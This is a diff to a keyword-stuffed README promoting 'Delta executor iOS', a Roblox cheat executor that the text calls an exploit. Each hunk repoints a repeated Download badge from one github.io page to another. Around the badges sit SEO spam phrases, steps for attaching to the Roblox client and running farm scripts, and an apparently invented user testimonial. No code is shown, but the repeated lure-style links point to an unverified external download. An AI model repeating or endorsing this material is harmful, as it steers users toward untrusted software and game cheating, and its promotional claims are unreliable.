@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/deltaios/)
+[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/delta/)
 
 </div> 
 
@@ -31,7 +31,7 @@ While many players know delta from mobile as **delta executor android** or **del
 - 🤝 **Community Integration** – Built to pair with an active **delta executor discord server** for sharing configs, scripts, and advice.  
 - 🔐 **Config Profiles & Export** – Export/share configurations via GitHub or **delta executor discord** without exposing sensitive data.  
 
-[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/deltaios/)  
+[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/delta/)  
 
 Compared with generic tools and outdated forks like some **delta iOS** variants, this project prioritizes stability, predictable updates, and a single trusted **delta executor github** source of truth. Instead of hunting for “**delta executor download apk**” or random mirrors, iOS users get a consistent **delta executor iOS download** path that fits normal iOS workflows.  
 
@@ -58,7 +58,7 @@ Compared with generic tools and outdated forks like some **delta iOS** variants,
 
 > 💬 *“I used delta on Android for years, but moving to a iOS broke my workflow. The new **delta executor iOS** build finally gives me a native Roblox Delta iOS Executor experience without spinning up Windows.”*  
 
-[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/deltaios/)
+[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/delta/)
 
 ***
 
@@ -82,7 +82,7 @@ Compared with generic tools and outdated forks like some **delta iOS** variants,
    - Click “Attach” to hook into **delta executor roblox** client.  
    - Paste or load your script (e.g., **delta executor blox fruit 2026** farm script) and press “Execute”.  
 
-[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/deltaios/)
+[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/delta/)
 
 ### 2. Other Platforms (Context Only)
 
@@ -93,7 +93,7 @@ This repository focuses on iOS, but many users also know delta from:
 
 You can mention these in docs only to clarify that this project is the iOS counterpart of the wider **roblox Delta iOS Executor** ecosystem.  
 
-[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/deltaios/)
+[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/delta/)
 
 ***
 
@@ -142,7 +142,7 @@ Deltaios is the best and one of top level executors used as Roblox exploits, des
 
 These specs help keep both Roblox and **delta executor iOS** responsive, even when running heavier scripts like **delta executor script blox fruit** in large servers.  
 
-[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/deltaios/)
+[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/delta/)
 
 ***
 
@@ -198,7 +198,7 @@ Whether you are running **delta executor script blox fruit**, experimenting with
 
 ### 🚀 Ready to Start?
 
-[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/deltaios/)
+[![Download](https://img.shields.io/badge/Download%20iOS%20xecutor%20delta-brightgreen?style=for-the-badge&logo=github)](https://deltaios-devz.github.io/delta/)
 
  – grab the latest build and start scripting on iOS today.  
 
